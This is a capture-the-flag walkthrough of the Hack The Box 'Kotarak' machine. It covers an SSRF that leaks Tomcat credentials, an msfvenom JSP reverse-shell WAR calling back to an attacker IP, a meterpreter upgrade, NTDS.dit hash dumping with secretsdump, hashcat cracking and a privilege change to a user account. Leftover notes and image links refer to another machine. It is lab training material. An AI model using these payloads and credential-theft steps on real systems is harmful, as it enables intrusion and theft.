


Nmap
```
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (EdDSA)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 2 webservers

* **http://kotarak.htb:8080/**
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>
  
  We do some dirbusting and we see the /examples directory, whchich comes default with the installation
  
  Nothing unusual anywhere else.
  
  We also have a login at /manager/html but we dont have any creds yet


* **http://kotarak.htb:60000/**

  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>
  
  Looks like a browser inside a browser (Inception :D )
  
  We try to query the local 8080 page we found and it returns the same thing like before
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>
  
  It looks like it some kind of proxy, maybe there are other ports internally which are open
  
  After some dirbusting we find this
  ```http://10.10.10.55:60000/url.php?path=127.0.0.1:60000/server-status```
  
  The server status page shows that there are many ports open which has different stuff on it
  
  One of the ports has some juicy info 
  ```http://10.10.10.55:60000/url.php?path=localhost:888/?doc=backup```
  
  username="admin" password="3@g01PdhB!"

| Username            | Password            |
| ------------- |:-------------------------:|
| admin    | 3@g01PdhB!     |


Lets try that Username and Password at the 8080 login page

We are in!!

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>

Lets create a msfvenom reverse shell payload 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.112 LPORT=4443 -f war > dotalol.war
```

Start a listner with msfvenom

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload/java/jsp_shell_reverse_tcp 
msf exploit(handler) > set LHOST 10.10.15.112
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.112     yes       The listen address
   LPORT  4443             yes       The listen port
   SHELL                   no        The system shell to use.
```

Upload the .war to the 

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>

After we deplot it, we start the listner and visit ```http://kotarak.htb:8080/dotalol/```

```
[*] Command shell session 1 opened (10.10.15.112:4443 -> 10.10.10.55:56176) at 2017-12-24 03:26:20 +0530

msf exploit(handler) > sessions -i

Active sessions
===============

  Id  Name  Type              Information  Connection
  --  ----  ----              -----------  ----------
  1         shell java/linux               10.10.15.112:4443 -> 10.10.10.55:56176 (10.10.10.55)
```

Lets upgrade it to a meterpreter shell for better use

```
msf exploit(handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.15.112:4433 
[*] Sending stage (847604 bytes) to 10.10.10.55
[*] Meterpreter session 2 opened (10.10.15.112:4433 -> 10.10.10.55:33194) at 2017-12-24 03:26:39 +0530
[*] Command stager progress: 100.00% (736/736 bytes)
msf exploit(handler) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information                                             Connection
  --  ----  ----                   -----------                                             ----------
  1         shell java/linux                                                               10.10.15.112:4443 -> 10.10.10.55:56176 (10.10.10.55)
  2         meterpreter x86/linux  uid=1001, gid=1001, euid=1001, egid=1001 @ 10.10.10.55  10.10.15.112:4433 -> 10.10.10.55:33194 (10.10.10.55)

```

After some enumerating we find something

```
meterpreter > pwd
/home/tomcat/to_archive/pentest_data
meterpreter > ls
Listing: /home/tomcat/to_archive/pentest_data
=============================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100644/rw-r--r--  16793600  fil   2017-07-21 21:46:23 +0530  20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
100644/rw-r--r--  12189696  fil   2017-07-21 21:46:45 +0530  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

Lets download both the files into our machine and rename them to something simpler like kotarak.dit and kotarak.bin

There is a nice writeup on how we can extract data from .dit files [here](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)


Lets use the all great Impacket !!

Install all the dependencies and it should work. If any errors or the output isnt right, there is also a manual way of doing it on the link above which works perfectly fine.

After running secretsdump.py we get something like this
```
root@kali:~/hackthebox/Machines/Kotarak/writeup/impacket/examples# python secretsdump.py -ntds ../../kotarak.dit -system ../../kotarak.bin LOCAL
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from ../../kotarak.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
..
..
..
```

Lets hascat that
```
.\hashcat64.exe -m 1000 .\hash.txt --username .\rockyou.txt
e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
```

Seems legit F16 

Lets get a shell on meterpreter and try to su as the user

We check `/etc/passwd` and we find that the username is atanas

```
meterpreter > shell

python -c 'import pty; pty.spawn("/bin/sh")'
$ su atanas
su atanas
Password: f16tomcat!

atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ whoami
whoami
atanas

```

***user.txt***
```
atanas@kotarak-dmz:~$ cat user.txt
cat user.txt
93f844f50491ef797c9c1b601b4bece8
```

The root folder has 2 files and they are actually readable, checking them out

```
atanas@kotarak-dmz:/root$ls -l
ls -l
total 8
-rw------- 1 atanas root 333 Jul 20 22:53 app.log
-rw------- 1 atanas root  66 Aug 29 11:36 flag.txt
atanas@kotarak-dmz:/root$ cat flag.txt
cat flag.txt
Getting closer! But what you are looking for can't be found here.
atanas@kotarak-dmz:/root$ cat app.log
cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

It looks like there is something else on the network at ```10.0.3.133```

Checking ifconfig shows that we are connected to another network and our local ip for that network is ```10.0.3.1```

We also see the wget version and its old af
```
root@kali:~/hackthebox/Machines/Kotarak# searchsploit wget 1.1
```

| Exploit Title                                                   |  Path                       |
|:-------------------------:                                      |:-------------------------:  |
|GNU Wget < 1.18 - Access List Bypass / Race Condition            | multiple/remote/40824.py    |
|GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution  | linux/remote/40064.txt      |
|wget 1.10.2 - (Unchecked Boundary Condition) Denial of Service   | multiple/dos/2947.pl        |






-------------------------------- **NOTES** -----------------------------
```
Images:
    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>

Tables:
| IP            | Machine                   |
| ------------- |:-------------------------:|
| 10.25.25.2    | DC (dc.fulcrum.local)     |
| 10.25.25.3    | FILE (file.fulcrum.local) |
```
